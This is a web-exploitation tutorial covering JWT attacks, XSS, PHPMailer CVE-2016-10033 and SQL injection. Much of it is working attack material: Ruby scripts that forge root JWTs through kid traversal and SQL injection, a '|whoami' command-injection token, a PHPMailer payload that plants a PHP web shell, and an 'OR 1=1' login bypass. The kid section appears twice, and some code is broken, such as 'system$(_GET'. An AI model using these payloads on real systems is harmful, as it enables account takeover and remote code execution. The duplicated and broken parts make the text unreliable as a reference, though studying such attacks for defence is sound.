# Learning from the Field: Web Exploitation

## JWT

JSON Web Token (JWT) is an Internet standard for creating data with optional signature and optional encryption. JWTs can be signed using a secret (with the HMAC algorithm) or a **public/private** key pair using **RSA** or **ECDSA**.

### Usage of JWTs

A very common use of a JWT token is as an API **authentication mechanism** as well as **Information Exchange**.

#### Authentication Mechanism

Once the user is logged in, the user can access everything allowed with that token.

#### Information Exchange

JWTs are useful in sharing information because they are signed by public/private keys as well as we can verify the token if it's tampered or not.

### JSON Web Token structure

JWTs cosists of 3 parts seperated by dots.

`header.payload.signature`

#### Header

Header consist of two things: first one is **type of token** and another thing is **signing algorithm** like HMAC SHA256 or RSA.

For Example:

`Base64:    eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0=`

After Decoding:

``` json
{
  "alg": "SH256",
  "typ": "JWT"
} 
```

#### Payload

Payload contains the claims. Claims are statements about the user and additional data about the user.

For Example:

`Base64: eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ==`

After Decoding:

```json
{
    "id": "1",
  "name": "Anas Jamal",
  "admin": true
} 
```

#### Signature

For creating the signature part you have to take the base64 encoded header and payload, a secret, the algorithm specified in the header, and sign that.

For Example:

```js
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
  )
```

#### All 3 Combined

`Header + Payload + Secret`

```js
eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0.eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ.6pqwrq5XQFq3453rtw234fuZ4
```

### Implmenting

Whenever you will recieve a jwt token first decode it and break it into parts like we have learnt in the above section.

`Header + Payload + Secret`

#### Decoding

For decoding you can use:

1. Terminal  
2. [jwt.io](https://jwt.io/)
3. Decoder tab in burp Suite

There are other ways for decoding the token too.

##### Terminal

Linux:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -d 
```

Mac OS:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -D 
```

Note: Keep in mind in mac os we use "D" instead of  "d".

##### jwt.io

just copy the whole token and paste it into `Encoded` Section and you will get decoded token in `Decoded` Section.

##### Burp Suite Decoder

Copy the whole token and go to burp suite `Decoder` tab and paste it there and select first part and click on `decode` as `base64` and do the same thing with other parts of the token.

**Note** : Don't include dot(`.`) while decoding the token.

#### None Algorithm

`None` Algorithm is used when the integrity of the token has been already verified but hackers can use this algorithm and can tamper the token and can gain unauthorized access.
Let's See How

```js
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.6pqwrq5XQFq3453rtw234fuZ4
```

#### JWT Token Break Down

1. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)
2. eyJ1c2VyIjoidGVzdCJ9 (Payload)
3. 6pqwrq5XQFq3453rtw234fuZ4 (Secret)

After Decoding:

Header:

```js
{
    "alg":"HS256",
    "typ":"JWT"
}
```

Payload:

```js
{
    "user":"test"
}
```

Now let's change "alg" from `HS256` to `None` and "user" from `test` to `admin`

Header After Changes:

```js
{
    "alg":"None",
    "typ":"JWT"
}
```

Payload After Changes:

```js
{
    "user":"admin"
}
```

Now base64 encode `Header` and `Payload` and send the new token to the web application with empty `secret`.

New Token:

```js
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

For encoding we can use :

1. CyberChef
2. Burp Suite Decoder
3. Your Terminal

For encoding on Terminal just remove `-d` / `-D` let's see an example

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64
```

For sending Requests we can use:

1. Inspect Element > Go to cookies > replace the token with your new token.
2. Burp Suite Intercept or send the requests to repeater and play with the request.

So this is one simple way of hacking JWTs.


### Exploiting JWT

#### CVE-2016-5431 Key Confusion Vulnerability

##### RSA

The `RSA` is asymmetric and in assymetric we have 2 keys

```md
1. Public Keys (for verifying you need a public key coresponding to the private key used for the signature.)

2. Private Keys. (For signing the token you need a private key)
```

Library Function: `verify(clientToken, serverRSAPublicKey)`

##### HMAC

The `HMAC` uses the same secret for signing as well as verifying the token.

Library Function: `verify(clientToken, serverHMACSecretKey)`

##### The Vulnerability

The vulnerability is straight forward, The attacker can change the algorithm from `RS256` to `HS256` that means from RSA to HMAC .

So when you send the tampered cookie the code will call `verify(clientToken, serverHMACSecretKey)` instead of `verify(clientToken, serverRSAPublicKey)` because our token algorithm is `HS256`.

Now Public keys are available publicly and we can forge our new token by changing the algorithm from `RS256` to `HS256` and signing our token with the publicly available key.

##### The Exploitation

We can exploit it in several ways we will mention 3 methods:

1. Manually decoding / encoding and signing.
2. Writing your own script using any scripting language (ruby/python).
3. using [jwt_tool](https://github.com/ticarpi/jwt_tool).

The easiest way is using [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

1. clone the tool and install all dependencies.
2. Download the public key in the same directory.
3. Run the tool

Syntax : `./jwt_tool.py <paste your token>`

```py
./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImFuYXMifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ

```

##### OUTPUT

after running choose option 1 for tampering with the token.

```md
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = RS256

Token payload values:
[+] login = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

```

After choosing `1` choose `0` and press `1` and change `<your username>` to `admin` in this case from `anas` to `admin`.

```md
====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = RS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] login = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of login is: demo
Please enter new value and hit ENTER
> admin
[1] login = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step
```

press `0`

Now the last Step:
The vulnerability here is `Sign with HS/RSA key confusion vulnerability` choose `4` and type the name of public key file name in this case our public key file name is `public.key` and hit `Enter` and if everything goes well we will get our new forged token.

```md
Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 4

Please enter the Public Key filename:
> public.key

====================================================================
This option takes an available Public Key (the SSL certificate from 
a webserver, for example?) and switches the RSA-signed 
(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.
====================================================================
File loaded: public.key

Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
(This will only be valid on unpatched implementations of JWT.)

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.CN6XRx3X4MavzJW0pYNJWJzt0xdSLwnGRX6uHr35qGA

```

Now just send the forged cookie to the site using curl, burp suite, or simply using inspect element.
Finally we will get admin access :)

#### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

### Local File Inclusion

Let's Take an Example :

#### Token

```js
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```js
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

#### Command Injection

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

#### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

#### Local File Inclusion

Let's Take an Example :

#### Token

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```ruby
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

### Command Injection in KID

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### SQLi in KID

SQLi in KID is very similar to `Command Injection` and `Local File Inclusion` because `KID` can also retrieve key from the databse.

let's see an example :

```json
{
"alg" : "HS256",
"typ" : "JWT",
"kid" : "1"
}
```

If SQLi is possible in KID we can forge our own `root` account token using a simple ruby / python script or manually.

#### Ruby Script

```ruby

require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "keynotpresent\' UNION SELECT \'newkey"}'
payload = '{"user": "root"}'

header_payload = Base64.strict_encode64(header)+"."+ Base64.strict_encode64(payload)
header_payload.gsub!("=","")

secret = "newkey"

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, header_payload))

token = header_payload+"."+signature
puts token
```

#### Explaination

The script imports `base64` and `openssl` modules and the real trick is in `header` the payload forces application to sign the token with key value `newkey` because `keynotpresent` does not exist in the database so it will use `newkey` as it's secret and sign it and we know that secret so we can forge our token easily and sign them.

#### Token After Running the Script

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogImtleW5vdHByZXNlbnQnIFVOSU9OIFNFTEVDVCAnbmV3a2V5In0.eyJ1c2VyIjogInJvb3QifQ.zRLDqEZ1tQC8atcO7bjvHaSTTpEefORDyqgFUnZH4Ok`

### Cracking JWTs Secret

Sometimes developers use common terms as a token secret.
If that's the case we can crack them easily. We can use [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

First let's Prepare a wordlist:

```bash
password
Password123
admin
root
hackingbible
```

you can also use `rockyou.txt` or there are lots of wordlists present on the internet.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 7
Please provide filename for dictionary file.

> wordlist.txt

Loading key dictionary...
File loaded: wordlist.txt
Testing passwords in dictionary...

[+] hackingbible is the CORRECT key!
```

If we got lucky we can get the Correct key. Now after cracking the secret we can just forge the token.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = HS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: None
Please enter new value and hit ENTER
> admin
[1] user = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 1

Please enter the known key:
> hackingbible

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc+N077EOEhFVJdvA7ufgp8qb+fLLUkIyqZc

```

Voila!! we got our admin token, now just use inspect element or burp suite repeater and refresh you will get admin session.

## XSS

Cross-Site Scripting (XSS) attacks are a type of injection.Using This You can inject malicious payload in to the website.

### Type Of XSS

#### Reflected XSS

It occurs when an application receives data in an HTTP request and includes that data within the response

```html
   http://example.com/data?username=Data+Example

   <h2> Username : Data Example </h2>
````

It can not perform any other processing in data so that we can inject our payload easyly.

```html
   http://example.com/data?username=<script>/* Your Payload */ </script>

   <h2> Username : <script>  /* Your Payload */ </script>
```

##### Impact of Reflected XSS

* It Perform any action that user can perform in website.
* View and modify any information that user can do

#### Stored XSS

Its occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=temp+feedback

  <p>temp feedback </p>
```

It can not perform any other processing in data so that we can inject our payload easyly.
here we use encoded url.

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=%3Cscript%3E%20%20%2F*%20Your%20Payload%20*%2F%20%3C%2Fscript%3E

  <p><script>  /* Your Payload */ </script></p>
```

When its execute in website now it is permanently added in that website and any user can view that

##### Impact of Stored XSS

* Attackers can change any parameters and write anything in the website source code
* Attackers can easyly execute that malicious code in website
* The key difference between reflected and stored XSS is that stored XSS vulnerabilities are contained within the application and the attacker does not need to induce the target to click on a specific link with their exploit.

#### DOM (Document Object Model) XSS

Its occurs when an application contains some client-side JavaScript that processes data from an untrusted source, usually by writing the data back to the DOM.

```html
var search = document.getElementById('username').value;
var results = document.getElementById('results');
results.innerHTML = 'Your username is : ' + username;

```

Hear attacker can control the value of input field so that they can create their own malicious payload and execute it

```html
 Your username is : <img src=1 onerror='/* Your Payload */'>
```

##### Impact of DOM XSS

* Account Hijacking : Attackers often steal session cookies in the browser to hijack user accounts.
* Credential Theft  : Attackers can clone the page and sent that page to victim and victim use credentials and its forward to attacker.
* Data Leakage : attacker has access to the personal or sensitive information of users

## PHPMailer CVE-2016-10033

This bug is very interesting and very easy to exploit. Let's breakdown the basic Functionality of PHPMailer.

```steps
 1) PHPMailer gets user requests
 
 2) PHPMailer validates the user supplied information
 
 3) PHPMailer sends the information to the PHP mail() function to send the email.
```

### Bug

The problem here is PHPMailer does not clean the user supplied email values before sending it to the PHP mail() function. it basically returns `$result` and pass it to mail() function.

### Exploitation

The exploitation is simple

`"malicious@127.0.0.1\" -oQ/tmp/ -X/var/www/malicious.php  root"@127.0.0.1` 

Pass this into `FROM` field and your PHP code into mail body.

```malicious
<?php system$(_GET["command"]); ?>
```

intercept the request and edit the request in it and forward it or you can just simply change type from `mail` to `text` and send. 

So in the above code we are basically creating a file `malicious.php` and the code of that file is in `body` of the mail.

now just visit :
`https://vulnerablesite.com/malicious.php?command=whaomi`

and we got rce easily through this vulnerability in PHPMailer also you can get reverse shell using this method.

## SQL Injection

In this we will discuss about SQL Injections let's first see a simple definition of SQL.
SQL is `Structured Query Language`, which is a computer language for storing, manipulating and retrieving data stored in a database.

Now let's understand SQL Injection. Basically SQL injections are web security vulnerabilities that are very dangerous and allows an attacker to alter the logic of the query and the attack can lead to data theft, website defacement (changing the content of website), sometimes it can allow an attacker to delete or modify the data inside the data. So from this you can now imagine how dangerous SQL injection is.

### Let's Clear Some Basics First

First we have to know types of queries in SQL:

1. SELECT : It is used to select data from the database.

  Syntax:

  ```syntax
   SELECT column1, column2, ...
   FROM table_name; 
```
  
2. INSERT : adding new rows to a table.

  Syntax:

  ```syntax
   INSERT INTO table_name (column1, column2, column3, ...)
   VALUES (value1, value2, value3, ...);  
```

3. UPDATE: It is used to update any record of data in a table.

Syntax:

  ```syntax
   UPDATE table_name
   SET column1 = value1, column2 = value2, ...
   WHERE condition;  
```

4. DELETE: Removing rows from a table

```syntax
   DELETE FROM table_name WHERE condition;
```

5. Stored Procedures : MSSQL procedures xp_cmdshell which can be used for executing commands on the remote database host.

Now let's see how to make comments in SQL.
we can make comments using two hyphens. 

`--`

the query after `--` will be ignored and that's very useful in sql injection.

Let's take an example :

`SELECT username,password FROM users WHERE username='$INPUT1$' AND password='$INPUT2$';`

Where $INPUT1$ and $INPUT2$ are taken from the user of the application.

Basically our above query is checking if the user input values are present inside the database or not.

let's assume `$INPUT$` = `test` and `$INPUT2` = `testpass`

our payload: `test' OR 1=1 --`

For better understanding let's break down the payload and insert it into the query.

```query
SELECT username,password FROM users WHERE username='test' OR 1=1 --' AND password='testpass';
```

Payload Breakdown:

`test'` : it is breaking out the `''` in the query.

`OR` : OR becomes true whenever we have atleast one condition true.

`1=1` : for making our whole query always true we are using `1=1` that is always true.

`--` : As we have saw earlier `--` comments out the rest of the query that means password check is "commented out" so that it has no effect.

So ultimately the attacker has altered the logic of the statement and that could bypass authentication cause the database to leak confidential information or even execute functions such as executing operating system commands.

### Detecting Vulnerable Functions

A effective way to do detect vulnerable functions is to generate an error or to alter the query in such a way that we have successfully injected into SQL and possibly see a visible result. e.g. SQL-like syntax being parsed in the expected way.

Consider the following query which loads a news article from the database to display on an fictitious web application:

`SELECT id,title,content FROM tblArticles WHERE id=$input`

when we pass `'` as an input the website will return an error. if we got an error we have to confirm it that it is due to `'` and we can confirm it by few ways.

1. `--'` : this will tell the database ignore everything after the `--` .

2. If the user input is integer we can try to subtract it with some number and if that works that means we have an sqli.

For example:

`http://sql.example.org/news?id=100`

  Now let's subtract 1 from 100.

`http://sql.example.org/news?id=100-1`

and if we got `id=99` that means we have an sqli.

3. What if we have a string instead of a integer?

For Example:

`http://sql.example.org/news?page=example`

With the above case itâ€™s possible to utilize string concatenation in a similar way, where if the string is evaluated and concatenated then the output should not change whereas if it is no evaluated then a noticeable change in output will occur. The method of concatenation differs between back-end database types however if one works you have the added benefit of fingerprinting the database type!.

#### MSSQL

```mssql
exa'+'mple
With URLs a + is space, use %2b instead (URI encoded plus sign)!
```

#### MySQL

```mysql
exa' 'mple (that's a space between two apostrophes)
```

#### Oracle

```oracle
exa'||'mple
```

Another way of detecting the vulnerability is to concatenate a simple conditional at the end of the input, such as:

```ex
AND 1=1 -- (This will get evaluated as True as 1=1)
AND 1=2 -- (This will get evaluated as False as 1 is not equal to 2)
```

Awesome now we have learned lots of tricks but what if `'` is not allowed ? In that case we can use comparisons between valid and invalid system variables. Let's see the example:

```ex
AND (SELECT @@version)=(SELECT @@version) -- 

AND SLEEEP(5)=SLEEP(5) --
```

First one is valid but is invalid because `SLEEEP` is not equal to `SLEEP` .




